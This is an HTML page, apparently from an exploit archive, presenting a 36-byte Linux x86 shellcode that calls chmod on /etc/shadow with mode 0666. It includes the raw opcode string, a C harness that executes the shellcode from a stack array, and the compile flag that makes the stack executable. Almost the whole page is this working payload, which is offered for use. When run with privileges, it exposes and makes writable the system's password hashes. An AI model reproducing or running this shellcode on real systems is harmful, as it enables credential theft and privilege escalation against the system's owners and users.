<html><head><title>Linux/x86 - chmod(/etc/shadow, 0666) - 36 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
 
/*
by Magnefikko
14.04.2010
magnefikko@gmail.com
promhyl.oz.pl
Subgroup: #PRekambr
Name: 36 bytes chmod(&quot;/etc/shadow&quot;, 0666) shellcode
Platform: Linux x86
 
chmod(&quot;/etc/shadow&quot;, 0666);
gcc -Wl,-z,execstack filename.c
 
shellcode:
 
\xeb\x12\x5b\x31\xc0\x31\xc9\x31\xd2\xb1\xb6\xb5\x01\xb0\x0f\x89\x53\x0b\xcd\x80\xe8\xe9\xff\xff\xff\x2f\x65\x74\x63\x2f\x73\x68\x61\x64\x6f\x77
 
*/
 
 
int main(){
char shell[] =
&quot;\xeb\x12\x5b\x31\xc0\x31\xc9\x31\xd2\xb1\xb6\xb5\x01\xb0\x0f\x89\x53\x0b\xcd\x80\xe8\xe9\xff\xff\xff\x2f\x65\x74\x63\x2f\x73\x68\x61\x64\x6f\x77&quot;;
printf(&quot;by Magnefikko\nmagnefikko@gmail.com\npromhyl.oz.pl\n\nstrlen(shell)
= %d\n&quot;, strlen(shell));
(*(void (*)()) shell)();
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
